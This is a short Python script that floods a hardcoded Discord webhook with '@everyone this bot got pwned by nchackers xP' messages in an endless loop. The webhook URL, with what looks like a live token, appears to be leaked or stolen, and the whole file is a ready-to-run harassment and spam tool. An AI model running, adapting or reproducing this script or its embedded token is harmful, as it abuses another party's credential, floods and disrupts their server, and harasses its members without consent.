import requests

webhooks = ["https://discord.com/api/webhooks/1072341862679060490/G8pt2A-LkbR3bHWYCPv9UUwFg1AynLzfXMH7qZeSP2i8uKdPVajj6km0E05g8c-Ksr9n"] 
data = {"content": "@everyone this bot got pwned by nchackers xP"}

while True:
    for url in webhooks:
        response = requests.post(url, json=data)

        if response.status_code == 204:
            print("Message sent successfully")
        else:
            print("Message sending failed with status code:", response.status_code)
